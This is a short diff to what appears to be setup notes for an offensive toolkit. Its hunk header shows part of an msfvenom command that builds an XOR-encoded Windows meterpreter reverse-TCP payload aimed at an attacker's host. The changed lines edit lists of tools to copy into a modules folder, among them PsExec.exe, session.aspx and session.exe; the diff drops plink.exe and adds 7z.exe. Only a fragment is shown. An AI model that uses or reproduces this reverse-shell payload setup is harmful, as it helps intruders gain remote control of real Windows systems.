@@ -20,7 +20,6 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp -e x64/xor LHOST=<ip_attacker> L
 ```
 - Copy these files from `Resources` to `~/modules/`
 ```
-plink.exe
 PsExec.exe
 sysinfo.ps1
 7z.exe
@@ -30,6 +29,7 @@ sysinfo.ps1
 ```
 PsExec.exe
 sysinfo.ps1
+7z.exe
 session.aspx
 session.exe
 ```
